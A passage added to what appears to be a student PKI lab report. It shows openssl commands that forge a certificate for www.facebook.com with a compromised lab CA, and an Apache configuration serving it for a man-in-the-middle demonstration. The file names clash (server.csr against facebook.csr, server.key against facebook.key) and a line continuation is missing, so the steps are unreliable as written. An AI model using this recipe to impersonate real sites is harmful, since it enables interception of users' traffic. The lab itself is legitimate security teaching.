@@ -664,3 +664,49 @@ When we tried to access www.facebook.com, we got the following warning:
 This is attributed to the inconsistency of the certificate used because the domain name does not match that present in the server's certificate.
 
 This type of websites detect this and warn the user.
+
+
+## 3.6 Task 6: Launching a Man-In-The-Middle Attack with a Compromised CA
+
+In this case, we want to create a certificate for www.facebook.com and we can do that by doing the commands in the task 2.
+
+For this, we will use the following commands:
+
+```
+openssl req -newkey rsa:2048 -sha256 \
+-keyout server.key -out server.csr \
+-subj "/CN=www.facebook.com/O=Jonpedsam Inc./C=US" \
+-passout pass:dees
+-addext "subjectAltName = DNS:www.facebook.com, \
+DNS:www.jonpedsam.com, \
+DNS:www.jonpedsamC.com, \
+DNS:www.jonpedsamD.com"
+```
+
+```
+openssl ca -config openssl.cnf -policy policy_anything -md sha256 -days 3650 -in facebook.csr -out facebook.crt -batch -cert ca.crt -keyfile ca.key
+```
+
+Then, we changed the apache file for this:
+
+```
+<VirtualHost *:443>
+    DocumentRoot /var/www/jonpedsam
+    ServerName     www.facebook.com
+    ServerAlias    www.jonpedsam.com
+    ServerAlias    www.jonpedsamC.com
+    ServerAlias    www.jonpedsamD.com
+    DirectoryIndex index.html
+    SSLEngine On
+    SSLCertificateFile /certs/facebook.crt
+    SSLCertificateKeyFile /certs/facebook.key
+</VirtualHost>
+
+<VirtualHost *:80>
+    DocumentRoot /var/www/jonpedsam
+    ServerName www.facebook.com
+    DirectoryIndex index_red.html
+</VirtualHost>
+```
+
+Then, we restarted the server with the new certificate and the apache conf and we successfully visited www.facebook.com.
